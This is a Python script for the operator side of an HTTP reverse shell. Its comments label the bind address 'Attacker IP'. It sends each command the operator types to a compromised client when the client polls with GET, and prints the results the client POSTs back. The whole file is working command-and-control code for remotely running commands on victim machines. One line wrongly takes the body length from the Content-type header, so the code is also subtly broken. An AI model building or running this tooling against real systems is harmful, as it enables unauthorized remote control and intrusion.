import http.server  
  
HOST_NAME = "192.168.0.0"  # Attacker IP  
PORT = 8080  # Listener port  
  
  
# what the server response when he received http requests  
class MyHandler(http.server.BaseHTTPRequestHandler):  
    # Ask the client do execute the command  
    def do_GET(self):  
        command = input("Shell> ")  
        self.send_response(200)  # response from the client successfully  
  
        # send the request to the client side to execute the command  
        self.send_header("Content-type", "text/html")  
        self.end_headers()  
        self.wfile.write(command.encode())  
        return  
  
    # received the response of the command execute by the client  
    def do_POST(self):  
        self.send_response(200)  
        self.end_headers()  
        length = int(self.headers['Content-type'])  # byte of the post request  
        post_var = self.rfile.read(length)  
        print(post_var.decode())  
        return  
  
  
if __name__ == "__main__":  
    server_class = http.server.HTTPServer  
    httpd = server_class((HOST_NAME, PORT), MyHandler)  
    try:  
        httpd.serve_forever()  
    except KeyboardInterrupt:  
        print('[!] Server is terminated')  
        httpd.server_close()